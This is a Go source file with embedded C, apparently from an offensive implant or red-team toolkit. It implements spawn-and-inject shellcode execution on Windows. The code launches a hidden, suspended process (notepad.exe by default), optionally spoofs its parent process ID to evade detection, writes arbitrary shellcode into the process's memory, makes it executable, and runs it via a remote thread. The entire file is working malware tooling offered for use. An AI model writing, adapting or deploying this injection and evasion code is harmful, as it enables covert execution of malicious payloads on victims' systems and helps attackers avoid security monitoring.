//go:build windows && amd64 && cgo

package inject

/*
#cgo CFLAGS: -O2
#include <windows.h>

int inject_shellcode_spawn(
    const wchar_t* exePath,
    const wchar_t* cmdLine,
    int ppid,
    unsigned char* shellcode,
    int shellcodeLen,
    int killAfter
) {
    (void)killAfter;

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};

    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);

    HANDLE hParent = NULL;
    if (ppid > 0) {
        hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)ppid);
        if (!hParent) return -10;

        // Use PROC_THREAD_ATTRIBUTE_PARENT_PROCESS for PPID spoofing
        SIZE_T attrSize = 0;
        InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
        if (attrSize == 0) {
            CloseHandle(hParent);
            return -11;
        }

        LPPROC_THREAD_ATTRIBUTE_LIST attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
        if (!attrList) {
            CloseHandle(hParent);
            return -12;
        }

        if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
            HeapFree(GetProcessHeap(), 0, attrList);
            CloseHandle(hParent);
            return -13;
        }

        if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
            DeleteProcThreadAttributeList(attrList);
            HeapFree(GetProcessHeap(), 0, attrList);
            CloseHandle(hParent);
            return -14;
        }

        STARTUPINFOEXW siEx = {0};
        siEx.StartupInfo.cb = sizeof(siEx);
        siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
        siEx.StartupInfo.wShowWindow = SW_HIDE;
        siEx.lpAttributeList = attrList;

        wchar_t* cmdLineCopy = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, (wcslen(cmdLine) + 1) * 2);
        wcscpy(cmdLineCopy, cmdLine);

        if (!CreateProcessW(exePath, cmdLineCopy, &sa, NULL, FALSE,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
            NULL, NULL, (LPSTARTUPINFOW)&siEx, &pi)) {
            HeapFree(GetProcessHeap(), 0, cmdLineCopy);
            DeleteProcThreadAttributeList(attrList);
            HeapFree(GetProcessHeap(), 0, attrList);
            CloseHandle(hParent);
            return -15;
        }

        HeapFree(GetProcessHeap(), 0, cmdLineCopy);
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(hParent);
    } else {
        wchar_t* cmdLineCopy = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, (wcslen(cmdLine) + 1) * 2);
        wcscpy(cmdLineCopy, cmdLine);

        if (!CreateProcessW(exePath, cmdLineCopy, &sa, NULL, FALSE,
            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            HeapFree(GetProcessHeap(), 0, cmdLineCopy);
            return -16;
        }
        HeapFree(GetProcessHeap(), 0, cmdLineCopy);
    }

    // Inject shellcode into the suspended process
    LPVOID remoteAddr = VirtualAllocEx(pi.hProcess, NULL, (SIZE_T)shellcodeLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteAddr) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -2;
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteAddr, shellcode, (SIZE_T)shellcodeLen, &bytesWritten)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -3;
    }

    DWORD oldProtect;
    if (!VirtualProtectEx(pi.hProcess, remoteAddr, (SIZE_T)shellcodeLen, PAGE_EXECUTE_READ, &oldProtect)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -4;
    }

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);
    if (!hThread) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -5;
    }

    CloseHandle(hThread);
    CloseHandle(pi.hProcess);

    // Resume the suspended main thread — shellcode already executing via remote thread
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    return 0;
}
*/
import "C"

import (
	"fmt"
	"syscall"
	"unsafe"
)

// InjectWithSpawn 创建一个新进程并将 shellcode 注入其中。
// 支持 PPID 欺骗（创建进程时指定父进程）。
func InjectWithSpawn(cfg *SpawnConfig) *InjectResult {
	if cfg == nil || len(cfg.Shellcode) == 0 {
		return &InjectResult{
			Success: false,
			Message: "invalid config or empty shellcode",
		}
	}

	exePath := cfg.ProcessName
	if exePath == "" {
		exePath = "C:\\Windows\\System32\\notepad.exe"
	}

	cmdLine := exePath
	if len(cfg.ProcessArgs) > 0 {
		cmdLine = exePath + " "
		for _, arg := range cfg.ProcessArgs {
			cmdLine += arg + " "
		}
	}

	exePathUTF16, err := syscall.UTF16PtrFromString(exePath)
	if err != nil {
		return &InjectResult{Success: false, Message: fmt.Sprintf("UTF16 encode exePath: %v", err)}
	}
	cmdLineUTF16, err := syscall.UTF16PtrFromString(cmdLine)
	if err != nil {
		return &InjectResult{Success: false, Message: fmt.Sprintf("UTF16 encode cmdLine: %v", err)}
	}

	ret := C.inject_shellcode_spawn(
		(*C.wchar_t)(unsafe.Pointer(exePathUTF16)),
		(*C.wchar_t)(unsafe.Pointer(cmdLineUTF16)),
		C.int(cfg.PPID),
		(*C.uchar)(unsafe.Pointer(&cfg.Shellcode[0])),
		C.int(len(cfg.Shellcode)),
		func() C.int { if cfg.Kill { return 1 }; return 0 }(),
	)

	if ret != 0 {
		return &InjectResult{
			Success: false,
			Message: fmt.Sprintf("spawn+inject failed: code=%d", int(ret)),
		}
	}

	return &InjectResult{
		Success: true,
		Message: fmt.Sprintf("shellcode injected into spawned process (%s)", exePath),
	}
}
